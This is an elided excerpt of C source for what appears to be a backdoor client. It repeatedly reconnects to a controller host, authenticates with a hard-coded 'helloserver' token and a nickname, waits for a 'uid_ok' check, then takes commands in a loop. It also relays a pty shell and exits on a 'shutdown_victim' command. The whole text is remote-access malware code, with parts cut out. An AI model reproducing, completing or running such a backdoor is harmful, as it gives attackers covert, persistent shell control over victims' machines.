        ...
        while (1) {
            ...
            if (FD_ISSET(mpty, &rd)) {
                if ((ret = read(mpty, buffer, BUFSIZ)) > 0) {
                    ...
                    debuglog("[warn] seems logout. quit shell...");
                    break;
                }
            }
        }
...
int talk_cntl(char *nick)
{
    ...
    while (1) {
        ...
        if (connect(cntl, (struct sockaddr *)&cntl_addr, sizeof(cntl_addr)) < 0) {
            debuglog("[error] fail connect to cntl, trying reconnect...: %s", strerror(errno));

        } else {
            // first send auth token to cntl
            if (wsend(cntl, "helloserver", 11) < 0) {
                debuglog("[error] send auth token failed. bye...");
                close(cntl);
                return 1;
            }
            ...
            if (wsend(cntl, nick, strlen(nick)) <= 0) {
                debuglog("[error] send nick failed. bye...");
                close(cntl);
                return 1;
            }
            ...
            if (wrecv(cntl, buffer) <= 0) {
                debuglog("[error] cannot recv uid check from cntl. bye...");
                close(cntl);
                return 1;
            }
            if (strcmp(buffer, "uid_ok")) {
                debuglog("[error] uid not verified ok. bye...");
                close(cntl);
                return 1;
            }

            debuglog("[note] waiting here...");

            while (1) {
                // check connection status
                getsockopt(cntl, IPPROTO_TCP, TCP_INFO, &info, (socklen_t *)&sockinfo);
                if (info.tcpi_state != TCP_ESTABLISHED) {
                    debuglog("[error] connection broken, reconnect...");
                    close(cntl);
                    break;
                }
                ...
                bzero(&buffer, sizeof buffer);
                if (wrecv(cntl, buffer) <=0) {
                    debuglog("[error] get command failed, reconnect...");
                    close(cntl);
                    break;
                }
                ...
                if (strcmp(buffer, "shutdown_victim") == 0) {
                    debuglog("[note] got shut command, exit.");
                    close(cntl);
                    return 0;
                }
...
int main(int argc, char **argv)
{
    ...
    if (illegal_nick(nick)) {
        debuglog("[error] nickname is illegal: %s", argv[1]);
        return 1;
    }
